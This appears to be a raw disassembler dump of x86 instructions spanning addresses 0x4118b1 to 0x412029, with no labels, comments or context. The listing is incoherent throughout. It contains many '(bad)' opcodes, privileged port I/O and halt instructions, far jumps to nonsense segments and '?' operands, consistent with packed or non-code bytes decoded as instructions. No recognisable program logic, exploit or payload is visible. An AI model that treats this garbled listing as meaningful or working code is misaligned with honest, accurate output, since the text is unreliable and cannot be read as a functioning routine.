  4118b1:	lods   al,BYTE PTR ds:[esi]
  4118b2:	dec    esi
  4118b3:	push   es
  4118b4:	fs jno 0x4118d1
  4118b7:	inc    esi
  4118b8:	pop    esp
  4118b9:	(bad)  
  4118ba:	cli    
  4118bb:	inc    edi
  4118bc:	fs pusha 
  4118be:	add    DWORD PTR ds:0x536bde1a,0x3ac83490
  4118c8:	fsub   DWORD PTR [edi]
  4118ca:	shl    BYTE PTR [esi+0x3f],cl
  4118cd:	mov    al,ds:0x7acc53b1
  4118d2:	ds mov ebx,0x3c72cd81
  4118d8:	cld    
  4118d9:	ds mov dh,0x8b
  4118dc:	adc    ah,cl
  4118de:	mov    ax,ds:0x1cdaca48
  4118e4:	rcr    BYTE PTR [esi+0x20a6ad84],0x17
  4118eb:	es out dx,al
  4118ed:	xchg   esp,eax
  4118ee:	test   eax,0x9c0870ac
  4118f3:	sub    al,0x16
  4118f5:	inc    ecx
  4118f6:	out    dx,al
  4118f7:	mov    ds:0x921ea64c,eax
  4118fc:	sub    eax,eax
  4118fe:	js     0x41190a
  411900:	test   al,0x3b
  411902:	outs   dx,BYTE PTR ds:[esi]
  411903:	shr    DWORD PTR [eax+0x34],1
  411906:	mov    ah,BYTE PTR [edx-0x60d57ba]
  41190c:	inc    ebp
  41190d:	les    edi,FWORD PTR [ecx-0x5151335f]
  411913:	pop    dx
  411915:	popf   
  411916:	out    0x4a,eax
  411918:	mov    BYTE PTR [edi],dl
  41191a:	cmp    al,0x9c
  41191c:	popf   
  41191d:	inc    esi
  41191e:	popa   
  41191f:	sbb    al,0x68
  411921:	pop    ebx
  411922:	retf   
  411923:	push   esi
  411924:	pusha  
  411925:	push   ds
  411926:	jae    0x411965
  411928:	jg     0x411911
  41192a:	xchg   edi,eax
  41192b:	dec    edi
  41192c:	jp     0x411966
  41192e:	xchg   DWORD PTR [edi+0x69cde53a],ebx
  411934:	mov    ebx,0x1acbe529
  411939:	pushf  
  41193a:	jge    0x4118f4
  41193c:	cmp    BYTE PTR [eax],0x57
  41193f:	sbb    BYTE PTR [esi],dh
  411941:	adc    DWORD PTR [esi+0x7d],ebp
  411944:	and    al,0x9
  411946:	inc    esp
  411947:	ss add al,0xca
  41194a:	aaa    
  41194b:	adc    DWORD PTR [esi-0x6964f917],esi
  411951:	shl    dh,cl
  411953:	sti    
  411954:	lds    esi,FWORD PTR [eax+eiz*8]
  411957:	push   ecx
  411958:	mov    cx,0x1757
  41195c:	repz std 
  41195e:	mov    BYTE PTR ds:0xeb85c7eb,ah
  411964:	dec    ebx
  411965:	test   al,0xe8
  411967:	or     dh,dh
  411969:	pop    esi
  41196a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41196b:	hlt    
  41196c:	dec    eax
  41196d:	sti    
  41196e:	in     eax,dx
  41196f:	xchg   ebx,eax
  411970:	sub    al,0x3a
  411972:	sub    dl,BYTE PTR [eax+0x6a0e5890]
  411978:	sub    al,0x49
  41197a:	push   edx
  41197b:	out    0xdd,eax
  41197d:	sub    BYTE PTR [eax-0x34],dh
  411980:	pusha  
  411981:	shl    BYTE PTR [ebx],0xf0
  411984:	xchg   edi,eax
  411985:	cld    
  411986:	fadd   QWORD PTR [ebx+0x64a11dd9]
  41198c:	mul    DWORD PTR [edx-0x3f]
  41198f:	dec    edx
  411990:	inc    edx
  411991:	jno    0x411958
  411993:	pop    ss
  411994:	cmp    BYTE PTR [edx-0x19d636d5],ah
  41199a:	loopne 0x411926
  41199c:	cmp    ecx,ebx
  41199e:	cmp    BYTE PTR [ebx-0x2e],ch
  4119a1:	scas   eax,DWORD PTR es:[edi]
  4119a2:	xlat   BYTE PTR ds:[ebx]
  4119a3:	ins    BYTE PTR es:[edi],dx
  4119a4:	mov    al,0x3d
  4119a6:	loope  0x411990
  4119a8:	std    
  4119a9:	fs mov esi,0xb5eba651
  4119af:	call   FWORD PTR [esi+0x53]
  4119b2:	and    al,0x0
  4119b4:	xchg   edx,eax
  4119b5:	add    DWORD PTR [edi+0x34],edi
  4119b8:	rol    DWORD PTR [edi],1
  4119ba:	clc    
  4119bb:	mov    bl,0x9d
  4119bd:	inc    esi
  4119be:	mov    ebp,0x9bdc0d5
  4119c3:	pop    ss
  4119c4:	loop   0x411a37
  4119c6:	and    BYTE PTR [ecx-0x240c860a],bl
  4119cc:	gs push esp
  4119ce:	outs   dx,BYTE PTR ds:[esi]
  4119cf:	cdq    
  4119d0:	and    DWORD PTR [edi-0x3d4e403b],ebx
  4119d6:	xor    al,0x70
  4119d8:	mov    edi,DWORD PTR [edi]
  4119da:	sbb    eax,0x50dedc6f
  4119df:	cmp    bl,BYTE PTR [ecx-0xf]
  4119e2:	cmp    al,0x42
  4119e4:	push   ss
  4119e5:	leave  
  4119e6:	sbb    ch,al
  4119e8:	cmc    
  4119e9:	inc    ecx
  4119ea:	fcmovbe st,st(7)
  4119ec:	loope  0x411a4c
  4119ee:	repnz inc edx
  4119f0:	loopne 0x411a0c
  4119f2:	mov    ah,0x2f
  4119f4:	sbb    eax,0xfa9a3247
  4119f9:	jle    0x4119cd
  4119fb:	sub    ebp,DWORD PTR [esi+edx*4+0x5]
  4119ff:	cmc    
  411a00:	sub    BYTE PTR [edi-0x41],0x1
  411a04:	add    BYTE PTR ds:0xeb68ecf8,0xeb
  411a0b:	or     al,0xac
  411a0d:	push   edx
  411a0e:	je     0x411a12
  411a10:	aad    0xe1
  411a12:	call   0xe87bbeed
  411a17:	cld    
  411a18:	(bad)  
  411a19:	xlat   BYTE PTR ds:[ebx]
  411a1a:	ficom  DWORD PTR [ebx]
  411a1c:	popa   
  411a1d:	pop    eax
  411a1e:	fcmove st,st(1)
  411a20:	stos   BYTE PTR es:[edi],al
  411a21:	imul   al
  411a23:	ja     0x411a36
  411a25:	(bad)  
  411a26:	jp     0x411a4e
  411a28:	in     eax,dx
  411a29:	cmc    
  411a2a:	retf   0x8161
  411a2d:	in     eax,dx
  411a2e:	or     DWORD PTR ds:0xa2089a58,edi
  411a34:	jb     0x411a7d
  411a36:	jmp    0x3f9a:0x18512f89
  411a3d:	xchg   edx,eax
  411a3e:	test   al,0x8b
  411a40:	stc    
  411a41:	(bad)
  411a44:	pusha  
  411a45:	icebp  
  411a46:	pop    edx
  411a47:	and    eax,0xe17eb412
  411a4c:	stc    
  411a4d:	pop    edi
  411a4e:	inc    esp
  411a4f:	xchg   ebx,eax
  411a50:	lds    edx,FWORD PTR [edx+ebp*4+0x6c8249f6]
  411a57:	jle    0x411a7f
  411a59:	pop    edi
  411a5a:	(bad)  
  411a5b:	mov    esi,0xa6fbd39c
  411a60:	sti    
  411a61:	push   esi
  411a62:	push   edi
  411a63:	sub    BYTE PTR [esi+0x40603f2],dl
  411a69:	mov    esp,cs
  411a6b:	or     cl,ch
  411a6d:	out    dx,al
  411a6e:	xchg   edi,eax
  411a6f:	mov    ch,0x2b
  411a71:	jo     0x411a65
  411a73:	pop    edx
  411a74:	shl    BYTE PTR [edi+edi*1-0x42a609cc],0x7b
  411a7c:	push   edi
  411a7d:	enter  0xf537,0x4f
  411a81:	(bad)  
  411a82:	jmp    0x411a72
  411a84:	add    al,0x28
  411a86:	mov    ds:0x9d9bc8d6,al
  411a8b:	loop   0x411a63
  411a8d:	jecxz  0x411af9
  411a8f:	(bad)  
  411a90:	mov    cl,0x18
  411a92:	mov    ebx,0x19be6e8c
  411a97:	sub    dh,ch
  411a99:	out    dx,al
  411a9a:	test   DWORD PTR [ebx+0x1],eax
  411a9d:	ins    BYTE PTR es:[edi],dx
  411a9e:	pop    ebp
  411a9f:	adc    BYTE PTR [edx-0x4d],al
  411aa2:	addr16 aas 
  411aa4:	inc    eax
  411aa5:	jb     0x411b06
  411aa7:	stc    
  411aa8:	jno    0x411aa9
  411aaa:	js     0x411af1
  411aac:	and    al,0x8b
  411aae:	out    dx,eax
  411aaf:	add    ebx,DWORD PTR [edx+0x183e3037]
  411ab5:	test   eax,0x78a19407
  411aba:	inc    ecx
  411abb:	jg     0x411aca
  411abd:	jl     0x411af2
  411abf:	out    0xe9,eax
  411ac1:	and    al,0x3
  411ac3:	jge    0x411abd
  411ac5:	mov    eax,ds:0x669f90fa
  411aca:	mov    dl,0x6d
  411acc:	js     0x411ad2
  411ace:	lods   eax,DWORD PTR ds:[esi]
  411acf:	push   ebp
  411ad0:	or     dh,BYTE PTR [edi+edx*8-0x2064dfbf]
  411ad7:	mov    ds:0x75290b8,al
  411adc:	imul   esp,DWORD PTR [esi-0x73],0x62da470e
  411ae3:	cs push cs
  411ae5:	cs cs push cs
  411ae8:	lahf   
  411ae9:	mov    cl,0xc1
  411aeb:	push   esi
  411aec:	sub    DWORD PTR [esi],ebp
  411aee:	cmp    al,0x7f
  411af0:	add    al,al
  411af2:	addr16 pop edx
  411af4:	jae    0x411aa3
  411af6:	adc    al,BYTE PTR [ecx-0x50]
  411af9:	xor    BYTE PTR [esi+0x48],dl
  411afc:	call   0x442ec899
  411b01:	and    al,0xcb
  411b03:	aaa    
  411b04:	mov    ds:0x68ec2452,al
  411b09:	adc    cl,BYTE PTR [eax]
  411b0b:	mov    eax,ds:0x186c6108
  411b10:	ds sar esi,1
  411b13:	sub    BYTE PTR [ecx+eiz*4-0x2be828fc],cl
  411b1a:	scas   al,BYTE PTR es:[edi]
  411b1b:	mov    eax,0xbd6535f4
  411b20:	adc    ch,BYTE PTR ds:0x9127ad69
  411b26:	test   DWORD PTR [ebp-0x4d],0x5aa3b25d
  411b2d:	pushf  
  411b2e:	ret    
  411b2f:	sahf   
  411b30:	jle    0x411b8e
  411b32:	popa   
  411b33:	pop    eax
  411b34:	and    eax,0x3f6d8cf6
  411b39:	xor    al,0xd0
  411b3b:	cdq    
  411b3c:	xor    ah,BYTE PTR [eax]
  411b3e:	je     0x411b73
  411b40:	sbb    BYTE PTR [eax+0x9218900],bl
  411b46:	add    eax,0xeb748152
  411b4b:	pop    ebx
  411b4c:	mov    bh,0x71
  411b4e:	jno    0x411b3c
  411b50:	dec    ebp
  411b51:	push   cs
  411b52:	push   esp
  411b53:	fisttp DWORD PTR [edi-0x41]
  411b56:	jne    0x411b65
  411b58:	mov    ?,ecx
  411b5a:	mov    ah,0x56
  411b5c:	adc    BYTE PTR [edx-0x33622b75],dl
  411b62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b63:	test   BYTE PTR [eax],ah
  411b65:	data16 into 
  411b67:	and    eax,0x333e16c5
  411b6c:	push   ds
  411b6d:	in     eax,0xd3
  411b6f:	dec    edx
  411b70:	ja     0x411bb6
  411b72:	cmp    eax,0x6d1d3ca8
  411b77:	lods   al,BYTE PTR ds:[esi]
  411b78:	fdivr  st(0),st
  411b7a:	inc    esp
  411b7b:	out    0x3a,eax
  411b7d:	xchg   ecx,eax
  411b7e:	outs   dx,DWORD PTR ds:[esi]
  411b7f:	xchg   ebx,eax
  411b80:	rcl    DWORD PTR [esi+0x10],0x8e
  411b84:	repz xor al,0xb4
  411b87:	mov    edi,0x695f981e
  411b8c:	mov    ds:0x2eacd2e6,eax
  411b91:	mov    esp,0x1b967e0c
  411b96:	mov    edx,DWORD PTR [ebx]
  411b98:	mov    edx,0x8f0ef3a4
  411b9d:	fidivr DWORD PTR gs:[esi-0x3afc86e6]
  411ba4:	sbb    al,0xbb
  411ba6:	test   al,0x98
  411ba8:	sub    DWORD PTR [edi+0x1e45d5bd],ebp
  411bae:	lahf   
  411baf:	imul   edx,DWORD PTR [bx],0x4a
  411bb3:	gs dec ebx
  411bb5:	push   ds
  411bb6:	das    
  411bb7:	(bad)  
  411bb8:	pusha  
  411bb9:	xchg   BYTE PTR [edi],bh
  411bbb:	cwde   
  411bbc:	dec    edi
  411bbd:	mov    eax,0xc4b80b67
  411bc2:	mov    ds:0x4487db21,al
  411bc7:	fwait
  411bc8:	xor    cl,BYTE PTR [eax-0x7566a91c]
  411bce:	sub    BYTE PTR [ebx],cl
  411bd0:	stc    
  411bd1:	dec    ecx
  411bd2:	mov    ch,0x41
  411bd4:	pop    esp
  411bd5:	xor    bh,BYTE PTR ds:0xf722cf71
  411bdb:	xor    BYTE PTR [edi-0x10c1b5bf],bl
  411be1:	push   ebp
  411be2:	aaa    
  411be3:	mov    bl,0x48
  411be5:	xor    cl,bl
  411be7:	adc    al,al
  411be9:	adc    ah,BYTE PTR [esi]
  411beb:	mov    WORD PTR [eax+0x730e5a9f],gs
  411bf1:	inc    ebp
  411bf2:	xor    esp,DWORD PTR [eax+0x4dcc34ae]
  411bf8:	scas   al,BYTE PTR es:[edi]
  411bf9:	adc    DWORD PTR [ecx],ebp
  411bfb:	adc    al,0xc8
  411bfd:	cmc    
  411bfe:	shr    DWORD PTR [ebx+0x28be949b],1
  411c04:	jae    0x411c51
  411c06:	cmp    eax,0x8e953261
  411c0b:	mov    ecx,0x7b05f2a1
  411c10:	(bad)  
  411c11:	js     0x411ba4
  411c13:	pop    esi
  411c14:	fs ret 0x3a4a
  411c18:	push   esp
  411c19:	retf   
  411c1a:	enter  0x6d64,0x15
  411c1e:	daa    
  411c1f:	xor    al,0x2c
  411c21:	ror    esp,1
  411c23:	out    dx,eax
  411c24:	xor    BYTE PTR [esi+0x2e],cl
  411c27:	or     BYTE PTR [ebp-0x55b90655],dl
  411c2d:	fucomp st(2)
  411c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c30:	sub    edi,DWORD PTR [edi+ebp*2]
  411c33:	dec    edi
  411c34:	test   eax,0x99c6bcf2
  411c39:	lods   eax,DWORD PTR ds:[esi]
  411c3a:	gs clc 
  411c3c:	jl     0x411bc8
  411c3e:	stos   DWORD PTR es:[edi],eax
  411c3f:	and    esi,edi
  411c41:	std    
  411c42:	mov    cs,WORD PTR [ecx]
  411c44:	dec    ebp
  411c45:	add    ebp,esi
  411c47:	outs   dx,DWORD PTR ds:[esi]
  411c48:	nop
  411c49:	adc    BYTE PTR [ecx+0x69],ch
  411c4c:	pop    ebx
  411c4d:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  411c4f:	mov    ebp,0x779d5d31
  411c54:	mul    dh
  411c56:	cmp    dl,BYTE PTR [edi+0x6620474]
  411c5c:	loopne 0x411bdf
  411c5e:	lods   al,BYTE PTR ds:[esi]
  411c5f:	outs   dx,BYTE PTR ds:[esi]
  411c60:	dec    eax
  411c61:	sub    BYTE PTR [ebp+ebx*1-0x4a],dl
  411c65:	push   eax
  411c66:	adc    BYTE PTR [ecx],ch
  411c68:	loop   0x411c59
  411c6a:	int3   
  411c6b:	jp     0x411c1f
  411c6d:	jle    0x411c61
  411c6f:	fiadd  DWORD PTR [ebx-0x44]
  411c72:	clc    
  411c73:	mov    eax,ds:0xfb91b5ae
  411c78:	dec    ecx
  411c79:	sti    
  411c7a:	enter  0xf236,0x3e
  411c7e:	jp     0x411c1f
  411c80:	and    ah,BYTE PTR [edi]
  411c82:	jge    0x411ca3
  411c84:	loope  0x411c79
  411c86:	repnz mov ch,0xa7
  411c89:	jne    0x411cfa
  411c8b:	pop    ebx
  411c8c:	mov    bh,0x76
  411c8e:	ds push 0xffffffa5
  411c91:	repz xor cl,BYTE PTR [ebx+ebx*2]
  411c95:	test   BYTE PTR [ebx],cl
  411c97:	aad    0x95
  411c99:	imul   edx,DWORD PTR [edi+0x496dbaef],0x40
  411ca0:	cwde   
  411ca1:	and    BYTE PTR [edx-0xc],0x29
  411ca5:	mov    ebx,0xdeab5d95
  411caa:	ror    ch,cl
  411cac:	xchg   esp,eax
  411cad:	mov    ?,WORD PTR [ecx+0x45d889bd]
  411cb3:	cmp    DWORD PTR [edx+0x6a11e458],ebp
  411cb9:	xor    BYTE PTR [ecx],dh
  411cbb:	pop    ds
  411cbc:	arpl   WORD PTR [ebx+0x421e9c97],ax
  411cc2:	ret    0x806a
  411cc5:	fwait
  411cc6:	and    al,BYTE PTR [edx+0x14]
  411cc9:	leave  
  411cca:	je     0x411cd1
  411ccc:	adc    BYTE PTR [edx-0x52],ch
  411ccf:	push   esi
  411cd0:	push   ebx
  411cd1:	jae    0x411ceb
  411cd3:	dec    ecx
  411cd4:	fiadd  DWORD PTR [ecx-0x62ab23b1]
  411cda:	mov    edi,0x63d27de3
  411cdf:	popa   
  411ce0:	sbb    DWORD PTR [eax],esi
  411ce2:	dec    ebp
  411ce3:	mov    WORD PTR [eax-0x53],?
  411ce6:	dec    esi
  411ce7:	pop    esp
  411ce8:	dec    esi
  411ce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cea:	sar    DWORD PTR [edi+0x21],1
  411ced:	xchg   ebp,eax
  411cee:	shl    DWORD PTR [edx+0x4e],1
  411cf1:	mov    ebx,0x2ee88bdb
  411cf6:	or     bl,dh
  411cf8:	gs cs jp 0x411cc3
  411cfc:	mov    DWORD PTR [eax],eax
  411cfe:	leave  
  411cff:	or     al,0xfb
  411d01:	jg     0x411cbc
  411d03:	push   esi
  411d04:	or     esi,DWORD PTR [esi-0x17]
  411d07:	jne    0x411cc9
  411d09:	test   eax,0x9b66d6ce
  411d0e:	push   edx
  411d0f:	mov    WORD PTR [esi],gs
  411d11:	rol    BYTE PTR [esi],cl
  411d13:	int3   
  411d14:	arpl   WORD PTR [edx],cx
  411d16:	and    eax,DWORD PTR [esi+0x16]
  411d19:	mov    ebx,0xa35a6e24
  411d1e:	mov    edi,0xe743e2ea
  411d23:	(bad)  
  411d24:	jbe    0x411cf6
  411d26:	adc    ebx,edx
  411d28:	jmp    0x45beca61
  411d2d:	jl     0x411d3f
  411d2f:	adc    bl,cl
  411d31:	ins    DWORD PTR es:[edi],dx
  411d32:	hlt    
  411d33:	out    0x88,eax
  411d35:	popa   
  411d36:	dec    esi
  411d37:	sbb    ebx,DWORD PTR [edx-0x54]
  411d3a:	dec    esi
  411d3b:	ins    DWORD PTR es:[edi],dx
  411d3c:	mov    eax,0xd0ff502b
  411d41:	xchg   esp,eax
  411d42:	dec    edx
  411d43:	out    0xbd,eax
  411d45:	fsubr  st,st(0)
  411d47:	pop    esp
  411d48:	push   ss
  411d49:	hlt    
  411d4a:	leave  
  411d4b:	push   0x64
  411d4d:	sub    bl,BYTE PTR [edx+0x742bf21a]
  411d53:	mov    bh,0x33
  411d55:	ja     0x411dc4
  411d57:	mov    ecx,0x68dfd19c
  411d5c:	shl    BYTE PTR [eax],1
  411d5e:	sbb    cl,dh
  411d60:	xchg   ebp,eax
  411d61:	cmp    al,BYTE PTR [ebx-0x5e]
  411d64:	inc    edi
  411d65:	push   eax
  411d66:	push   ss
  411d67:	sub    BYTE PTR [ecx+0x3983de9c],0x6e
  411d6e:	pushf  
  411d6f:	push   0x8e983eb2
  411d74:	imul   esi,DWORD PTR [ebp-0x49],0x2a
  411d78:	mov    al,0xfd
  411d7a:	inc    BYTE PTR [edi-0x78]
  411d7d:	(bad)  
  411d7e:	xor    BYTE PTR [edi+ecx*2+0x9d20a3e],ch
  411d85:	sbb    al,0x21
  411d87:	pop    ss
  411d88:	fnsave [ecx+0x1b]
  411d8b:	fistp  QWORD PTR [ebp+0x4a]
  411d8e:	mov    esi,0x27f59e4d
  411d93:	sbb    eax,0xdf998ee9
  411d98:	xchg   esi,eax
  411d99:	mov    ch,BYTE PTR [eax]
  411d9b:	fidivr DWORD PTR [eax]
  411d9d:	mov    cl,0xc0
  411d9f:	adc    BYTE PTR ss:[ebp+eax*2+0x5eeef17f],0x18
  411da8:	jp     0x411e04
  411daa:	aas    
  411dab:	adc    eax,0xebef6efa
  411db0:	inc    edi
  411db1:	jo     0x411e07
  411db3:	sub    DWORD PTR [eax+0x7c3a5956],esp
  411db9:	lock (bad) 
  411dbb:	pop    esp
  411dbc:	sub    dh,BYTE PTR [esi+0x2537eb0a]
  411dc2:	jg     0x411e2d
  411dc4:	ror    ch,0x79
  411dc7:	dec    ecx
  411dc8:	out    0x4a,eax
  411dca:	in     al,dx
  411dcb:	pop    es
  411dcc:	jge    0x411e0e
  411dce:	je     0x411dce
  411dd0:	je     0x411e1d
  411dd2:	out    dx,al
  411dd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dd4:	mov    eax,0x62c265a0
  411dd9:	sub    BYTE PTR [ecx+0xecd7ece],cl
  411ddf:	ret    
  411de0:	sbb    BYTE PTR ds:0x9ba9ff28,cl
  411de6:	dec    ebp
  411de7:	pop    esi
  411de8:	cld    
  411de9:	sub    ecx,DWORD PTR [ebp-0x604e84c5]
  411def:	adc    al,0xd3
  411df1:	and    ecx,DWORD PTR [ebx-0x1f8d7a70]
  411df7:	inc    ebx
  411df8:	add    BYTE PTR [ebp-0x3763c274],al
  411dfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dff:	cmp    DWORD PTR [ebx+0x65],esi
  411e02:	mov    ch,0x68
  411e04:	test   BYTE PTR ds:0x3a7bd7a6,dl
  411e0a:	jmp    DWORD PTR [ecx]
  411e0c:	fsub   DWORD PTR [ecx]
  411e0e:	push   ds
  411e0f:	pop    edi
  411e10:	popa   
  411e11:	es cli 
  411e13:	adc    al,0x5d
  411e15:	in     eax,dx
  411e16:	mov    eax,0xb77ffc8c
  411e1b:	mov    ebp,0x267edd61
  411e20:	inc    ebp
  411e21:	inc    ebx
  411e22:	fldcw  WORD PTR [edx]
  411e24:	repz retf 0xbe8c
  411e28:	je     0x411e50
  411e2a:	push   ebx
  411e2b:	ins    DWORD PTR es:[edi],dx
  411e2c:	push   es
  411e2d:	shl    DWORD PTR [eax],1
  411e2f:	dec    esp
  411e30:	rcr    BYTE PTR [ecx-0x463f730b],1
  411e36:	retf   0xaee5
  411e39:	mov    edx,0x7349464
  411e3e:	xchg   esi,eax
  411e3f:	mov    ebp,DWORD PTR [eax]
  411e41:	outs   dx,BYTE PTR ds:[esi]
  411e42:	mov    fs,WORD PTR [edi]
  411e44:	push   esp
  411e45:	pop    eax
  411e46:	ss pop edi
  411e48:	outs   dx,DWORD PTR ds:[esi]
  411e49:	std    
  411e4a:	add    eax,0xdb3537e4
  411e4f:	sbb    BYTE PTR [ecx],ah
  411e51:	cdq    
  411e52:	into   
  411e53:	scas   eax,DWORD PTR es:[edi]
  411e54:	stos   DWORD PTR es:[edi],eax
  411e55:	lea    eax,[ebx]
  411e57:	jecxz  0x411e7e
  411e59:	sbb    al,0x31
  411e5b:	mov    bh,0x7b
  411e5d:	mov    ebp,0x4091b082
  411e62:	jne    0x411e3e
  411e64:	pop    es
  411e65:	fadd   QWORD PTR [edi+0x52e3edc8]
  411e6b:	imul   esp,esp,0xffffff8b
  411e6e:	xor    esi,DWORD PTR ds:0x2cd774aa
  411e74:	retf   
  411e75:	nop
  411e76:	int3   
  411e77:	lahf   
  411e78:	imul   esp,eax,0xffffff97
  411e7b:	dec    esp
  411e7c:	push   edi
  411e7d:	pop    edx
  411e7e:	sar    BYTE PTR [eax-0x3ef029d8],0xb8
  411e85:	adc    al,0x79
  411e87:	sub    al,0xd3
  411e89:	mov    al,0x39
  411e8b:	cwde   
  411e8c:	hlt    
  411e8d:	retf   
  411e8e:	sub    ah,BYTE PTR [esi+0x1de55db8]
  411e94:	add    BYTE PTR [eax],0x8b
  411e97:	jno    0x411eb0
  411e99:	imul   ecx,DWORD PTR [esi],0x3f
  411e9c:	jbe    0x411e4c
  411e9e:	mov    al,ds:0xddca4664
  411ea3:	test   dl,dh
  411ea5:	repnz cmp BYTE PTR [eax],bh
  411ea8:	or     eax,ecx
  411eaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411eab:	mov    edi,0x341d5fc3
  411eb0:	mov    ah,0x61
  411eb2:	in     al,dx
  411eb3:	dec    esi
  411eb4:	pop    esp
  411eb5:	mov    edi,0xfd076f9
  411eba:	push   edi
  411ebb:	pushf  
  411ebc:	pop    edx
  411ebd:	pop    edx
  411ebe:	mov    ?,ecx
  411ec0:	dec    ecx
  411ec1:	xlat   BYTE PTR ds:[ebx]
  411ec2:	sub    edx,ebp
  411ec4:	les    ebx,FWORD PTR [eax]
  411ec6:	mov    ah,0xd7
  411ec8:	xlat   BYTE PTR ds:[ebx]
  411ec9:	ins    BYTE PTR es:[edi],dx
  411eca:	inc    esi
  411ecb:	xor    BYTE PTR [ebx+0x346073ec],bh
  411ed1:	add    ch,BYTE PTR [ecx+eax*2]
  411ed4:	jb     0x411f25
  411ed6:	xchg   edi,eax
  411ed7:	sti    
  411ed8:	stos   DWORD PTR es:[edi],eax
  411ed9:	fsubr  st(7),st
  411edb:	pop    ds
  411edc:	test   al,0x94
  411ede:	dec    ecx
  411edf:	mov    WORD PTR [esi],es
  411ee1:	loope  0x411f46
  411ee3:	sti    
  411ee4:	test   DWORD PTR [ebx-0x4f],0x2850c2b1
  411eeb:	nop
  411eec:	int    0x86
  411eee:	iret   
  411eef:	xchg   ecx,eax
  411ef0:	aad    0x3f
  411ef2:	cmp    al,0xe8
  411ef4:	sub    al,0x54
  411ef6:	mov    ch,0x6
  411ef8:	dec    ebp
  411ef9:	mov    ecx,ds
  411efb:	(bad)  
  411efd:	mov    bl,0x3
  411eff:	mov    WORD PTR [edi],fs
  411f01:	xor    al,0x3e
  411f03:	adc    dl,dh
  411f05:	mov    ebp,0xfb640475
  411f0a:	inc    ecx
  411f0b:	pop    esi
  411f0c:	fdiv   DWORD PTR [edx-0x1d900ee8]
  411f12:	outs   dx,DWORD PTR ds:[esi]
  411f13:	mov    ch,0x52
  411f15:	inc    eax
  411f16:	mov    al,0x32
  411f18:	or     DWORD PTR [esi+0x4a],edx
  411f1b:	cmp    esp,edx
  411f1d:	or     ah,BYTE PTR [ecx]
  411f1f:	mov    esi,0xb4852f55
  411f24:	std    
  411f25:	jmp    0x346e3388
  411f2a:	xor    al,0x40
  411f2c:	dec    esp
  411f2d:	data16 add bh,bl
  411f30:	mov    esi,0xdb677342
  411f35:	jmp    0x411fa9
  411f37:	jl     0x411f08
  411f39:	jnp    0x411f7a
  411f3b:	popf   
  411f3c:	sub    bh,BYTE PTR [edx]
  411f3e:	jne    0x411f7e
  411f40:	jae    0x411f25
  411f42:	iret   
  411f43:	scas   al,BYTE PTR es:[edi]
  411f44:	jnp    0x411ec8
  411f46:	mov    ah,ah
  411f48:	add    edi,esp
  411f4a:	mov    edi,0x5bba1916
  411f4f:	push   edi
  411f50:	out    dx,al
  411f51:	cmp    eax,0x6fd7367
  411f56:	fwait
  411f57:	out    0x92,eax
  411f59:	add    BYTE PTR [ebx-0xb],dh
  411f5c:	push   ecx
  411f5d:	lds    eax,FWORD PTR ds:0x52fe7eb
  411f63:	mov    ecx,0x62d884a5
  411f68:	ss scas eax,DWORD PTR es:[edi]
  411f6a:	mov    dl,0x8b
  411f6c:	fld    QWORD PTR [esi+0xf]
  411f6f:	mov    ch,0xa9
  411f71:	ins    BYTE PTR es:[edi],dx
  411f72:	jmp    0x563ce388
  411f77:	mov    eax,0x250e4e1d
  411f7c:	lods   eax,DWORD PTR ds:[esi]
  411f7d:	xor    ah,BYTE PTR [ecx+eax*4-0x1b935b0]
  411f84:	rcl    eax,1
  411f86:	dec    ebx
  411f87:	xchg   edi,eax
  411f88:	dec    edx
  411f89:	cmp    eax,DWORD PTR [esp+ecx*8]
  411f8c:	pop    ds
  411f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f8e:	jmp    0x7dd6:0x8ac6b73d
  411f95:	jae    0x411fef
  411f97:	lsl    ebp,sp
  411f9a:	mov    ah,0x38
  411f9c:	jg     0x412002
  411f9e:	and    al,bl
  411fa0:	mov    ch,0xe6
  411fa2:	cmp    DWORD PTR [edx-0x55],eax
  411fa5:	scas   eax,DWORD PTR es:[edi]
  411fa6:	push   edi
  411fa7:	mov    esp,0x1acc854a
  411fac:	or     BYTE PTR [eax-0x5c],bh
  411faf:	int    0xfe
  411fb1:	ret    
  411fb2:	mov    WORD PTR [eax+0x20a421fa],?
  411fb8:	cmp    al,0xd1
  411fba:	sub    al,0x1f
  411fbc:	stos   DWORD PTR es:[edi],eax
  411fbd:	hlt    
  411fbe:	int3   
  411fbf:	jb     0x411f9c
  411fc1:	pop    ds
  411fc2:	jnp    0x411f7a
  411fc4:	cwde   
  411fc5:	add    al,BYTE PTR [edi+0x6e]
  411fc8:	jl     0x411fb5
  411fca:	mov    ecx,0x1178e0fc
  411fcf:	clc    
  411fd0:	lea    ebx,[esi-0x1c]
  411fd3:	ret    0x31d0
  411fd6:	test   BYTE PTR [esi-0x376c878c],cl
  411fdc:	jb     0x412058
  411fde:	sbb    dl,ch
  411fe0:	(bad)  
  411fe1:	shl    DWORD PTR [ebx-0x25],1
  411fe4:	sbb    BYTE PTR [ebp+0x1d0b7a09],cl
  411fea:	pop    edi
  411feb:	outs   dx,DWORD PTR ds:[esi]
  411fec:	into   
  411fed:	sub    esi,DWORD PTR [ecx+0x47]
  411ff0:	inc    ecx
  411ff1:	repnz push ebp
  411ff3:	pop    ebx
  411ff4:	jecxz  0x41202c
  411ff6:	loop   0x411fd0
  411ff8:	add    al,0xc3
  411ffa:	sub    BYTE PTR [eax-0x348391ba],bl
  412000:	or     BYTE PTR [edi-0x2c1ee29b],cl
  412006:	es sti 
  412008:	popf   
  412009:	in     al,0x3a
  41200b:	inc    ebx
  41200c:	dec    edi
  41200d:	js     0x411fad
  41200f:	ins    BYTE PTR es:[edi],dx
  412010:	les    edi,FWORD PTR [eax]
  412012:	xor    eax,0x10f024ba
  412017:	inc    ecx
  412018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412019:	ins    BYTE PTR es:[edi],dx
  41201a:	pushf  
  41201b:	out    0x3c,al
  41201d:	loop   0x41207e
  41201f:	call   0x9ad3:0x3a771c29
  412026:	sub    BYTE PTR [ebx],bh
  412028:	sahf   
  412029:	sar    esi,cl
